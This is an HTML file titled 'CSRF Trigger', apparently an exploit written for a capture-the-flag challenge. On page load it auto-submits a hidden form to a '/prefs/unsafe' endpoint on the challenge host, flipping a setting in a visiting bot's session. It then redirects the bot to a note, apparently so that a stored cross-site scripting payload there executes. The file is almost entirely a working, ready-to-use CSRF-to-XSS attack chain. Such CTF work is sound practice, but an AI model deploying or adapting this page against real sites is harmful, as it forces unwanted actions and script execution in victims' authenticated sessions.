<!-- filepath: exploit.html -->
<html>
  <head>
    <title>CSRF Trigger</title>
  </head>
  <body onload="triggerExploit()">
    <p>Please wait...</p>
    <iframe name="csrfFrame" style="display:none;"></iframe>
    <form id="csrfForm" action="http://simplechallenge.ctf.onl:7189/prefs/unsafe" method="POST" target="csrfFrame">
      <!-- === REPLACE YOUR_XSS_NOTE_ID BELOW === -->
      <input type="hidden" name="id" value="8" />
      <input type="hidden" name="enable" value="1" />
    </form>
    <script>
      function triggerExploit() {
        document.getElementById('csrfForm').submit();
        // Delay to allow the POST request to complete and update the bot's session
        setTimeout(function() {
          // === REPLACE YOUR_XSS_NOTE_ID BELOW ===
          window.location.href = "http://simplechallenge.ctf.onl:7189/notes/8";
        }, 2000); // 2 second delay
      }
    </script>
  </body>
</html>
